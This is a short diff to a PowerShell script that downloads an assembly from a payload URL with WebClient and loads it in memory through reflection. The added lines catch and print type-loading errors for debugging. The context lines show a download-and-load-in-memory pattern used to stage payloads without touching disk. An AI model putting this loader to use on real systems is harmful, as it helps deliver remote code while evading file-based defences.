@@ -7,6 +7,16 @@ $dllBytes = (New-Object Net.WebClient).DownloadData($payloadUrl)
 Write-Host "[+] Loading assembly in-memory"
 $assembly = [System.Reflection.Assembly]::Load($dllBytes)
 
+# after loading the assembly...
+Write-Host "[*] Attempting to enumerate types (will show loader errors)"
+try {
+    $assembly.GetTypes() | ForEach-Object { Write-Host "    $_.FullName" }
+} catch [Reflection.ReflectionTypeLoadException] {
+    $_.LoaderExceptions | ForEach-Object {
+        Write-Host "LoaderException: $($_.Message)"
+    }
+}
+
 # 3) List all types in the assembly for inspection
 Write-Host "[*] Types in assembly:"
 $assembly.GetTypes() | ForEach-Object { Write-Host "    $_.FullName" }
